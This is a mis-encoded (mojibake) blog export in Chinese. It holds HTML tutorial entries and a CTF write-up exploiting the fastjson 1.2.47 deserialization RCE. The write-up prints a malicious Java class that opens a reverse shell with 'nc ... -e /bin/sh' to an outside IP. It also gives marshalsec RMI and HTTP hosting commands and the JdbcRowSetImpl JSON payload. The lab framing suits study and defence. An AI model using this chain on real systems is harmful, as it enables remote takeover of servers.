<h3 id="åŠ ç²—æ ‡ç­¾"><a href="#åŠ ç²—æ ‡ç­¾" class="headerlink" title="åŠ ç²—æ ‡ç­¾"></a>åŠ ç²—æ ‡ç­¾</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>åŠ ç²—<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="comment">&lt;!-- åŠ ç²—æ ‡ç­¾ --&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="æ–œä½“æ ‡ç­¾"><a href="#æ–œä½“æ ‡ç­¾" class="headerlink" title="æ–œä½“æ ‡ç­¾"></a>æ–œä½“æ ‡ç­¾</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>æ–œä½“<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="comment">&lt;!-- æ–œä½“æ ‡ç­¾ --&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="ä¸‹åˆ’çº¿æ ‡ç­¾"><a href="#ä¸‹åˆ’çº¿æ ‡ç­¾" class="headerlink" title="ä¸‹åˆ’çº¿æ ‡ç­¾"></a>ä¸‹åˆ’çº¿æ ‡ç­¾</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span>ä¸‹åˆ’çº¿<span class="tag">&lt;/<span class="name">u</span>&gt;</span><span class="comment">&lt;!-- ä¸‹åˆ’çº¿æ ‡ç­¾ --&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="ä¸­åˆ’çº¿æ ‡ç­¾"><a href="#ä¸­åˆ’çº¿æ ‡ç­¾" class="headerlink" title="ä¸­åˆ’çº¿æ ‡ç­¾"></a>ä¸­åˆ’çº¿æ ‡ç­¾</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">s</span>&gt;</span>ä¸­åˆ’çº¿<span class="tag">&lt;/<span class="name">s</span>&gt;</span><span class="comment">&lt;!-- ä¸­åˆ’çº¿æ ‡ç­¾ --&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="å›¾ç‰‡æ ‡ç­¾"><a href="#å›¾ç‰‡æ ‡ç­¾" class="headerlink" title="å›¾ç‰‡æ ‡ç­¾"></a>å›¾ç‰‡æ ‡ç­¾</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"hello.png"</span> <span class="attr">width</span>=<span class="string">"50px"</span>&gt;</span><span class="comment">&lt;!-- width/heightåªè®¾ç½®å…¶ä¸­ä¹‹ä¸€çš„æ—¶å€™ï¼Œä¼šæŒ‰ç…§åŸæ¯”ä¾‹è‡ªåŠ¨ç¼©æ”¾ --&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="å—æ ‡ç­¾"><a href="#å—æ ‡ç­¾" class="headerlink" title="å—æ ‡ç­¾"></a>å—æ ‡ç­¾</h2><h3 id="divæ ‡ç­¾"><a href="#divæ ‡ç­¾" class="headerlink" title="divæ ‡ç­¾"></a>divæ ‡ç­¾</h3><p> åˆ’åˆ†å—çš„ä¸»è¦ä½¿ç”¨æ ‡ç­¾<br> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="è¡¨æ ¼æ ‡ç­¾"><a href="#è¡¨æ ¼æ ‡ç­¾" class="headerlink" title="è¡¨æ ¼æ ‡ç­¾"></a>è¡¨æ ¼æ ‡ç­¾</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- æ–‡æ¡£ä¸­htmlå¼€å§‹çš„éƒ¨åˆ† --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- æä¾›æœ‰å…³æ–‡æ¡£å†…å®¹å’Œæ ‡æ³¨ä¿¡æ¯ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span><span class="comment">&lt;!-- ç¼–ç  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1px"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- è¡Œ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>ç¬¬ä¸€ä¸ªè¡¨å¤´<span class="tag">&lt;/<span class="name">th</span>&gt;</span> <span class="comment">&lt;!-- è¡¨å¤´ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>ç¬¬äºŒä¸ªè¡¨å¤´<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>ç¬¬ä¸‰ä¸ªè¡¨å¤´<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- ç¬¬äºŒè¡Œ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>å•å…ƒæ ¼<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- å•å…ƒæ ¼ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>å•å…ƒæ ¼<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- å•å…ƒæ ¼ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>å•å…ƒæ ¼<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- å•å…ƒæ ¼ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span><span class="comment">&lt;!-- æ–‡æ¡£ä¸­htmlçš„ç»“æŸ --&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="å•å…ƒæ ¼åˆå¹¶"><a href="#å•å…ƒæ ¼åˆå¹¶" class="headerlink" title="å•å…ƒæ ¼åˆå¹¶"></a>å•å…ƒæ ¼åˆå¹¶</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span>&gt;</span>è¡Œåˆå¹¶çš„å•å…ƒæ ¼<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- å•å…ƒæ ¼ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span>åˆ—åˆå¹¶å•å…ƒæ ¼<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- å•å…ƒæ ¼ --&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨å•å…ƒæ ¼åˆå¹¶æ—¶ï¼Œè¢«åˆå¹¶çš„åœ°æ–¹çš„å•å…ƒæ ¼è¦ç›¸åº”åœ°åˆ å»</p>
<h3 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h3><ul>
<li><p>æœ‰åºåˆ—è¡¨</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">"1"</span>&gt;</span><span class="comment">&lt;!-- typeæŒ‡å®šåºå·æ ·å¼ï¼Œé»˜è®¤æ˜¯åè¿›åˆ¶é˜¿æ‹‰æ¯”æ•°å­—ã€‚ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç¬¬ä¸€<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç¬¬äºŒ<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">"A"</span>&gt;</span><span class="comment">&lt;!-- åµŒå¥— --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç¬¬ä¸€<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç¬¬äºŒ<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç¬¬ä¸‰<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li><p>æ— åºåˆ—è¡¨</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç¬¬ä¸€<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç¬¬äºŒ<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">"A"</span>&gt;</span><span class="comment">&lt;!-- åµŒå¥— --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç¬¬ä¸€<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç¬¬äºŒ<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç¬¬ä¸‰<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
]]></content>
      <categories>
        <category>WebåŸºç¡€</category>
      </categories>
      <tags>
        <tag>htmlåŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson 1.2.47 RCEæ¼æ´--Java Fastjson Unserializeyé¢˜è§£</title>
    <url>/2022/08/02/fastjson-1-2-47-RCE%E6%BC%8F%E6%B4%9E-Java-Fastjson-Unserializey%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>æ‰“å¼€åœºæ™¯åæ‰«æå™¨æ‰«ä¸å‡ºä»»ä½•å¯ç–‘è·¯å¾„ï¼Œä½†æ˜¯ä½¿ç”¨burpæŠ“åŒ…ï¼Œè·å–å“åº”åŒ…çš„æ—¶å€™è·å¾—äº†ä¸€ä¸ª<code>source.zip</code>çš„æºç ï¼Œæ‰“å¼€åå‘ç°ï¼Œæ˜¯ä¸€ä¸ªä½¿ç”¨<code>Spring Boot</code>æ­å»ºçš„é¡¹ç›®ï¼ŒåŒæ—¶ä½¿ç”¨äº†<code>fastjson</code>ï¼Œè€Œä¸”è¯¥ç‰ˆæœ¬å­˜åœ¨<code>RCE</code>æ¼æ´ï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰ï¼</p>
<p>æ¼æ´æˆå› è¿™é‡Œå°±ä¸å±•å¼€ç»†è®²ï¼ˆ<del>ä¸»è¦æ˜¯æˆ‘ä¹Ÿè®²ä¸ä¼šï¼</del>ï¼‰ï¼Œè¿™é‡Œåªè®²æ€ä¹ˆåˆ©ç”¨è¯¥æ¼æ´åå¼¹<code>shell</code></p>
<a id="more"></a>

<h2 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h2><h3 id="ç¯å¢ƒï¼š"><a href="#ç¯å¢ƒï¼š" class="headerlink" title="ç¯å¢ƒï¼š"></a>ç¯å¢ƒï¼š</h3><table>
<thead>
<tr>
<th>ä¸»æœº</th>
<th>IP</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>Ubuntu è™šæ‹Ÿæœº</td>
<td>114.67.175.224</td>
<td>é¶æœºï¼Œè¿è¡Œwebé¡¹ç›®ï¼Œè¯¥é¡¹ç›®ä¸­ä½¿ç”¨äº†å­˜åœ¨æ¼æ´ç‰ˆæœ¬çš„<code>fastjson</code></td>
</tr>
<tr>
<td>cetos7 è™šæ‹Ÿæœº</td>
<td>175.178.153.72ï¼ˆå…¬ç½‘IPï¼‰</td>
<td>æ­å»ºwebç¯å¢ƒï¼ˆæä¾›æ¶æ„Javaå­—èŠ‚ç æ–‡ä»¶ï¼‰å’ŒRMIæœåŠ¡ï¼Œncæ¥æ”¶åå¼¹shellï¼›å®‰è£…å¥½gitã€mavenã€jdk1.8ï¼Œpythonã€nc</td>
</tr>
<tr>
<td>win 11 ç‰©ç†æœº</td>
<td>â€”</td>
<td>ä½¿ç”¨Postman å‘é€POC</td>
</tr>
</tbody></table>
<h3 id="æ­å»ºRMIæœåŠ¡"><a href="#æ­å»ºRMIæœåŠ¡" class="headerlink" title="æ­å»ºRMIæœåŠ¡"></a>æ­å»ºRMIæœåŠ¡</h3><p>ç”±centos7ä¸»æœºå®Œæˆè¯¥å·¥ä½œã€‚</p>
<p>è¿™é‡Œå€Ÿç”¨<code>marshalsec</code>å·¥å…·ï¼Œå…ˆåœ¨<code>GitHub</code>ä¸Šé¢ä¸‹è½½ç›¸å…³ä»£ç ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/RandomRobbieBF/marshalsec-jar</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>maven</code>æ„å»ºåŒ…ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd marshalsec</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>

<p>ç„¶åå‡†å¤‡ä»¥ä¸‹æ¶æ„ä»£ç æ–‡ä»¶<code>TouchFile.java</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String commands = <span class="string">"nc 175.178.153.72 4444 -e /bin/sh"</span>;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å°†æ¥é¶æœºä¸­ä¼šæ‰§è¡Œ<code>commands</code>ä¸­çš„å‘½ä»¤ï¼Œ<code>175.178.153.72</code>æ˜¯æˆ‘å°†æ¥æ¥å—åå¼¹<code>shell</code>çš„åœ°å€ã€‚</p>
<p>ç„¶åç¼–è¯‘è¯¥æ–‡ä»¶æˆå­—èŠ‚ç ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javac TouchFile.java</span><br></pre></td></tr></table></figure>

<p>ç„¶åä½¿ç”¨<code>python</code>æ­å»ºwebæœåŠ¡ï¼Œä½¿å¾—å¤–ç½‘èƒ½å¤Ÿè®¿é—®è¯¥å­—èŠ‚ç æ–‡ä»¶ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 1234</span><br></pre></td></tr></table></figure>

<blockquote>
<p>phthon2: python -m SimpleHTTPServer 1234</p>
</blockquote>
<p>ä½¿ç”¨å¤–ç½‘èƒ½å¤Ÿè®¿é—®è¯¥æ–‡ä»¶ï¼Œåˆ™è¯´æ˜webæœåŠ¡æ­å»ºå®Œæ¯•ï¼š</p>
<p><img src="https://cdn.yalexin.top/image-20220802082146840.png" alt="image-20220802082146840"></p>
<p><strong>æ³¨æ„ï¼š</strong>é˜²ç«å¢™è®°å¾—æ”¾å¼€è¯¥ç«¯å£ï¼Œå¹¶ä¸”å¦‚æœä½ æ­å»ºwebæœåŠ¡çš„ä¸»æœºæ˜¯åƒè…¾è®¯äº‘ä¸€æ ·çš„æœåŠ¡å•†æä¾›çš„ï¼Œè¿˜è¦åˆ°æ§åˆ¶å°æ”¾å¼€è¯¥ç«¯å£ã€‚</p>
<p>å¼€å§‹è¿è¡Œ<code>RMI</code>æœåŠ¡ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://175.178.153.72:1234/#TouchFile" 9988</span><br></pre></td></tr></table></figure>

<h3 id="ncå¼€å¯ç›‘å¬çª—å£"><a href="#ncå¼€å¯ç›‘å¬çª—å£" class="headerlink" title="ncå¼€å¯ç›‘å¬çª—å£"></a>ncå¼€å¯ç›‘å¬çª—å£</h3><p>ç”±centos7ä¸»æœºå®Œæˆè¯¥å·¥ä½œã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p><strong>æ³¨æ„ï¼š</strong>ä»¥ä¸Šæåˆ°çš„3ä¸ªç«¯å£ï¼Œå‡è¦åœ¨é˜²ç«å¢™ä¸­æ”¾å¼€ï¼Œå¹¶ä¸”åˆ°æ§åˆ¶å°æ”¾å¼€ç«¯å£ã€‚</p>
<h3 id="å¼€å§‹æ”»å‡»ï¼"><a href="#å¼€å§‹æ”»å‡»ï¼" class="headerlink" title="å¼€å§‹æ”»å‡»ï¼"></a>å¼€å§‹æ”»å‡»ï¼</h3><p>è¯¥å·¥ä½œç”±win11 ä¸»æœºå®Œæˆï¼Œä½¿ç”¨Postmanå‘é€æ•°æ®ï¼š</p>
<p><img src="https://cdn.yalexin.top/image-20220802083559738.png" alt="image-20220802083559738"></p>
<p><code>json</code>å¯¹è±¡ä¸ºï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://175.178.153.72:9988/TouchFile"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§‚å¯Ÿæˆ‘ä»¬çš„centosä¸»æœºï¼Œæˆ‘ä»¬å‘ç°ncçª—å£æˆåŠŸè·å–äº†é¶æœºçš„<code>shell</code>ï¼š</p>
<p><img src="https://cdn.yalexin.top/image-20220802084111576.png" alt="image-20220802084111576"></p>
<p>ä¸‹é¢ç›´æ¥è¿è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.yalexin.top/image-20220802083907002.png" alt="image-20220802083907002"></p>
<p>è¯»å–<code>flag</code>ï¼š</p>
<p><img src="https://cdn.yalexin.top/image-20220802083950974.png" alt="image-20220802083950974"></p>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p><code>Fastjson</code>æ˜¯é˜¿é‡Œå·´å·´æ¨å‡ºçš„ï¼Œæ€§èƒ½è¿˜ç®—ä¸é”™ï¼Œå›½å†…åº”è¯¥å¾ˆå¤šäººä½¿ç”¨ã€‚ä½†æ˜¯ä¹‹å‰çˆ†è¿‡å‡ æ¬¡ååºåˆ—åŒ–<code>RCE</code>æ¼æ´è®©æ— æ•°å‚å•†è‹¦ä¸å ªè¨€ï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œå›½äº§è½¯ä»¶ï¼Œä»»é‡é“è¿œï¼Œå¸Œæœ›å®ƒè¶Šæ¥è¶Šå¥½å§ï¼</p>
]]></content>
      <categories>
        <category>ç½‘ç»œæ”»é˜²</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>fastjson</tag>
        <tag>RCEæ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>htmlè¯­æ³•äºŒ</title>
    <url>/2020/03/07/html%E8%AF%AD%E6%B3%95%E4%BA%8C/</url>
    <content><![CDATA[<h2 id="è¡¨å•"><a href="#è¡¨å•" class="headerlink" title="è¡¨å•"></a>è¡¨å•</h2><p>HTML5ä¸­ï¼Œè¡¨å•æ˜¯HTMLè·å¾—ç”¨æˆ·è¾“å…¥çš„æ‰‹æ®µã€‚</p>
<ul>
<li><p>è¾“å…¥ç±»å‹è¡¨å•</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"è¯·è¾“å…¥å™¢"</span>&gt;</span><span class="comment">&lt;!-- textæ˜¯å•è¡Œæ–‡æœ¬æ¡†valueæ˜¯å ä½ç¬¦ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"è¯·è¾“å…¥å™¢"</span>&gt;</span><span class="comment">&lt;!--placeholderæ˜¯æç¤ºå†…å®¹--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"è¯·è¾“å…¥å™¢"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span>&gt;</span><span class="comment">&lt;!--maxlengthæŒ‡æ˜è¾“å…¥æœ€å¤§é•¿åº¦--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"è¯·è¾“å…¥å™¢"</span> <span class="attr">size</span>=<span class="string">"50"</span>&gt;</span><span class="comment">&lt;!--sizeæŒ‡æ˜è¾“å…¥æ¡†çš„é•¿åº¦--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"è¯·è¾“å…¥å™¢"</span> <span class="attr">readonly</span>&gt;</span><span class="comment">&lt;!--readonlyæŒ‡æ˜åªè¯»ï¼Œä¸å¯ç¼–è¾‘--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"è¯·è¾“å…¥å¯†ç å™¢"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">"10"</span> <span class="attr">cols</span>=<span class="string">"10"</span>&gt;</span> <span class="comment">&lt;!-- æŒ‡å®šè¡Œæ•°åˆ—æ•° --&gt;</span></span><br><span class="line">            è¿™æ˜¯å†…å®¹</span><br><span class="line">            gh</span><br><span class="line">            h</span><br><span class="line">            j</span><br><span class="line">        <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a></li>
<li><p>æŒ‰é’®ç±»å‹è¡¨å•</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="comment">&lt;!-- valueæ˜¯æäº¤è¡¨å•æ—¶ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„å†…å®¹ --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"type='button'æŒ‰é’®"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span>&gt;</span>æŒ‰é’®<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"type='submit'æŒ‰é’®"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>&gt;</span><span class="comment">&lt;!-- å¤é€‰æ¡† --&gt;</span></span><br><span class="line">       è¿™æ˜¯ä¸€ä¸ªå¤é€‰æ¡†</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"choose"</span>&gt;</span>å•é€‰1<span class="comment">&lt;!-- ä¸‰é€‰ä¸€æŒ‰é’®é›†åˆ --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"choose"</span> <span class="attr">checked</span>&gt;</span>å•é€‰2 <span class="comment">&lt;!-- é»˜è®¤é€‰ä¸­ --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"choose"</span>&gt;</span>å•é€‰3</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ä»¥ä¸Šä¸‰ç§å½¢å¼éƒ½å¯ä»¥å®ç°æŒ‰é’®çš„åŠŸèƒ½ï¼Œä½†æ˜¯ä¸‰è€…æœ‰ç€æœ¬è´¨çš„åŒºåˆ«ï¼Œbuttonæ¯”type=â€buttonâ€çš„åŠŸèƒ½å¤šï¼Œbuttonå¯ä»¥å½“ä»»ä½•æŒ‰é’®æ¥ä½¿ç”¨ï¼Œé€‚ç”¨èŒƒå›´æ›´å¹¿æ³›ã€‚</li>
<li>type=â€submitâ€ç”¨äºæäº¤è¡¨å•ï¼Œä½¿ç”¨èŒƒå›´æ¯”type=â€buttonâ€å°ä¸€äº›</li>
<li>type=â€buttonâ€ä¸€èˆ¬ç”¨äºé…åˆjsï¼ˆJavaScriptï¼‰ä½¿ç”¨</li>
<li>type=â€submitâ€ç”¨äºæäº¤è¡¨å•çš„æ—¶å€™ï¼Œå¿…é¡»å£°æ˜formé‡Œé¢çš„methodå±æ€§ï¼Œæœ€å¥½åŠ ä¸Šactionå±æ€§</li>
</ul>
</li>
<li><p>å…¶ä»–ç±»å‹è¡¨å•</p>
